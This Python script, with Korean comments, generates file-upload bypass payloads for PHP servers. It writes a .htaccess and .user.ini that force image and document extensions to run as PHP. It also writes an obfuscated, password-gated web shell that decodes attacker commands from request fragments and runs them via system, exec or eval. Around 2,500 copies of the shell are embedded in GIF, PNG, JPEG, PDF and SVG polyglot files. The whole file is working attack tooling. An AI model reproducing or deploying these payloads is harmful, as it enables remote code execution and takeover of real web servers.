import os
import random
import zlib
from pathlib import Path

PAYLOAD_DIR = 'bypass_payloads_attack_max_v20_layer5_ready'
METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_attack_v20.json')
LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_attack_v20.tex')

os.makedirs(PAYLOAD_DIR, exist_ok=True)

C2_DOMAIN = "http://127.0.0.1:6000"
ATTACK_CORE_USER_INI = f"""# v20 .user.ini
auto_prepend_file = {PAYLOAD_DIR}/stage1_v20.php
"""

ATTACK_CORE_HTACCESS = """# v20 .htaccess (Layer 5까지 강제)
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^(.*)\\.(gif|jpg|png|webp|pdf|svg|html|phar|evil)$ $1.php [L,QSA]
</IfModule>
<FilesMatch "\\.(gif|jpg|png|webp|pdf|svg|html|phar)$">
    SetHandler application/x-httpd-php
    ForceType application/x-httpd-php
</FilesMatch>
php_value auto_prepend_file stage1_v20.php
"""

STAGE1_V20 = f"""<?php
declare(strict_types=1);error_reporting(0);@ini_set('display_errors',0);
if(($_COOKIE['X-Sess']??'')!=='grok2026'||($_SERVER['HTTP_X_BYPASS']??'')!=='v20-l5')die();

class StealthShell_v20{{
    private string $sinkName; private int $offset;
    public function __construct(){{$this->offset=random_int(-25,25);$this->sinkName='';foreach([115,121,115,116,101,109] as $c)$this->sinkName.=chr($c+$this->offset);}}
    private function getRealSink(): callable{{$real='';for($i=0;$i<strlen($this->sinkName);$i++)$real.=chr(ord($this->sinkName[$i])-$this->offset);
        $c=[$real,'exec','passthru','shell_exec','system','popen','proc_open'];
        foreach($c as $s)if(function_exists($s))return $s;return fn($x)=>@eval($x);}}
    private function cmd(): string{{$d=($_GET['id']??'').($_SERVER['HTTP_X_FRAGMENT']??'').($_COOKIE['frag']??'');
        return base64_decode(strrev(str_rot13(preg_replace('/[^A-Za-z0-9+\\/=]/','',$d))));}}
    public function run(){{$this->getRealSink()($this->cmd());}}
}}
(new StealthShell_v20())->run();
?>
""".replace("{C2_DOMAIN}", C2_DOMAIN)

def save_payload(filename: str, content: bytes):
    path = os.path.join(PAYLOAD_DIR, filename)
    with open(path, 'wb') as f:
        f.write(content)
    if random.random() < 0.03:
        print(f"[+] 생성: {filename}")

def generate_aggressive_polyglot(strategy: int, stage_content: bytes):
    if strategy == 0:   # Phar + GIF
        phar = b'<?php __HALT_COMPILER(); ?>' + b'\x00' * 150 + stage_content
        return b'GIF89a' + phar, ".phar.gif", "phar_poly_v20"
    elif strategy == 1: # PNG tEXt chunk 
        header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x8c\x00\x00'
        text = b'\x00\x00\x00\x1f tEXtComment\x00' + stage_content + b'\x00' + b'IEND\xaeB`\x82'
        return header + text, ".png", "png_textchunk_v20"
    elif strategy == 2: # JPEG multi-segment
        header = b'\xff\xd8\xff\xe1\x00\x1aExif\x00\x00' + stage_content[:400] + b'\xff\xfe\x00\x0c' + stage_content[400:] + b'\xff\xd9'
        return header, ".jpg", "jpeg_multiseg_v20"
    elif strategy == 3: # PDF Polyglot
        pdf = b'%PDF-1.4\n%\xff\xff\xff\xff\n' + stage_content
        return pdf, ".pdf", "pdf_poly_v20"
    elif strategy == 4: # SVG + PHP
        svg = f'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><!--{stage_content.decode(errors="ignore")}--></svg>'.encode()
        return svg, ".svg", "svg_php_v20"
    else:  # fallback double extension + trailing
        return b'GIF89a' + stage_content + b'\x00' * random.randint(100, 400), ".php.jpg", "double_ext_v20"

def generate_v20():

    existing_files = os.listdir(PAYLOAD_DIR) if os.path.exists(PAYLOAD_DIR) else []
    if len(existing_files) > 100:
        print(f"[SKIP] 이미 {len(existing_files)}개의 페이로드가 {PAYLOAD_DIR} 폴더에 존재합니다.")
    else:
        save_payload(".htaccess", ATTACK_CORE_HTACCESS.encode())
        save_payload(".user.ini", ATTACK_CORE_USER_INI.encode())
        save_payload("stage1_v20.php", STAGE1_V20.encode())
        print("[*] 페이로드 생성을 시작합니다...")
        for i in range(2500):
            strategy = i % 12
            content = STAGE1_V20.encode()   
            if i % 6 == 0:
                content = zlib.compress(content)

            poly_content, ext, cat = generate_aggressive_polyglot(strategy, content)
            filename = f"{cat}_{i:04d}{ext}"
            save_payload(filename, poly_content)

        print(f"\n[SUCCESS] 생성완료  총 {len(os.listdir(PAYLOAD_DIR))}개 payload")
        print(f"폴더: {PAYLOAD_DIR}")

    payloads = []
    for f in os.listdir(PAYLOAD_DIR):
        if not f.endswith('.tex') and not f.endswith('.json'):
            tech = f.split('_v20')[0] if '_v20' in f else f.split('.')[0]
            payloads.append((tech, os.path.join(PAYLOAD_DIR, f)))
    return payloads

generate_bypasses = generate_v20

if __name__ == '__main__':
    generate_v20()